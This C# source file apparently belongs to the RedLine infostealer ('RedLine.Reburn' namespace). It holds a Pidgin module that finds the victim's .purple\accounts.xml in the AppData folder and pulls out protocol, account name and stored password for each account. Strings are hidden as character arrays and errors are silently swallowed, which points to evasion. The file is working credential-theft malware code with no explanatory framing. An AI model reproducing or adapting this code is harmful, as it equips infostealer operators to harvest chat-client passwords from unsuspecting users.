using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Applications;

public static class Pidgin
{
	public static List<LoginPair> ParseConnections()
	{
		List<LoginPair> list = new List<LoginPair>();
		try
		{
			string path = string.Format(new string(new char[24]
			{
				'{', '0', '}', '\\', '.', 'p', 'u', 'r', 'p', 'l',
				'e', '\\', 'a', 'c', 'c', 'o', 'u', 'n', 't', 's',
				'.', 'x', 'm', 'l'
			}), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			if (File.Exists(path))
			{
				list.AddRange(ParseCredentials(path));
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<LoginPair> ParseCredentials(string Path)
	{
		List<LoginPair> list = new List<LoginPair>();
		try
		{
			XmlTextReader reader = new XmlTextReader(Path);
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(reader);
			foreach (XmlNode childNode in xmlDocument.DocumentElement!.ChildNodes)
			{
				LoginPair loginPair = ParseAccounts(childNode);
				if (loginPair.Login != "UNKNOWN" && loginPair.Host != "UNKNOWN")
				{
					list.Add(loginPair);
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static LoginPair ParseAccounts(XmlNode xmlNode)
	{
		LoginPair loginPair = new LoginPair();
		try
		{
			foreach (XmlNode childNode in xmlNode.ChildNodes)
			{
				if (childNode.Name == new string(new char[8] { 'p', 'r', 'o', 't', 'o', 'c', 'o', 'l' }))
				{
					loginPair.Host = childNode.InnerText;
				}
				if (childNode.Name == new string(new char[4] { 'n', 'a', 'm', 'e' }))
				{
					loginPair.Login = childNode.InnerText;
				}
				if (childNode.Name == new string(new char[8] { 'p', 'a', 's', 's', 'w', 'o', 'r', 'd' }))
				{
					loginPair.Password = childNode.InnerText;
				}
			}
		}
		catch
		{
		}
		finally
		{
			loginPair.Login = (string.IsNullOrEmpty(loginPair.Login) ? "UNKNOWN" : loginPair.Login);
			loginPair.Host = (string.IsNullOrEmpty(loginPair.Host) ? "UNKNOWN" : loginPair.Host);
			loginPair.Password = (string.IsNullOrEmpty(loginPair.Password) ? "UNKNOWN" : loginPair.Password);
		}
		return loginPair;
	}
}
